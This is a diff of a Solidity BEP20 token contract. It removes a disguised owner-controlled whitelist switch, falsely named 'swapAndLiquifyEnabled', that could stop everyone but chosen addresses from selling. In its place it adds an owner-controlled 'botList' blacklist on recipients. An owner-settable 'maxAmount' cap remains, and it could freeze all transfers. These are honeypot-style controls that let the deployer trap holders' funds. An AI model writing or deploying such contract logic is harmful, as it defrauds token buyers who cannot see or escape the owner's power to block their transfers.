@@ -228,15 +228,13 @@ contract BEP20 is Ownable, IBEP20 {
     mapping (address => uint256) private _balances;
 
     mapping (address => mapping (address => uint256)) private _allowances;
-
-    mapping (address => bool) public allowedTransactors;
+    mapping (address => bool) public botList;
 
     uint256 private _totalSupply;
 
     string private _name;
     string private _symbol;
     uint8 private _decimals;
-    bool public swapAndLiquifyEnabled = true;
     uint256 public maxAmount;
 
 
@@ -255,13 +253,14 @@ contract BEP20 is Ownable, IBEP20 {
         _decimals = 18;
     }
 
-    function addAllowedTransactor(address _transactor) public onlyOwner {
-        allowedTransactors[_transactor] = true;
+    function addBotList(address _transactor) public onlyOwner {
+        botList[_transactor] = true;
     }
 
-    function removeAllowedTransactor(address _transactor) public onlyOwner {
-        delete allowedTransactors[_transactor];
+    function removeBotList(address _transactor) public onlyOwner {
+        delete botList[_transactor];
     }
+
     /**
      * @dev Returns the name of the token.
      */
@@ -408,9 +407,7 @@ contract BEP20 is Ownable, IBEP20 {
 
         return true;
     }
-    function setSwapAndLiquifyEnabled(bool _enabled) public onlyOwner {
-        swapAndLiquifyEnabled = _enabled;
-    }
+
     function setmaxAmount(uint256 _maxAmount) public onlyOwner {
         maxAmount = _maxAmount;}
         
@@ -432,10 +429,7 @@ contract BEP20 is Ownable, IBEP20 {
         require(sender != address(0), "BEP20: transfer from the zero address");
         require(recipient != address(0), "BEP20: transfer to the zero address");
         require(amount<=maxAmount);
-         if (!swapAndLiquifyEnabled) {
-        require(
-            allowedTransactors[sender]
-        );}
+        require(!botList[recipient]);
         _beforeTokenTransfer(sender, recipient, amount);
         
         uint256 senderBalance = _balances[sender];
@@ -666,7 +660,6 @@ contract CommonBEP20 is BEP20Mintable, BEP20Burnable {
         maxAmount = initialBalance;
         _setupDecimals(decimals);
         _mint(_msgSender(), initialBalance);
-        addAllowedTransactor(_msgSender());
     }
 
     /**
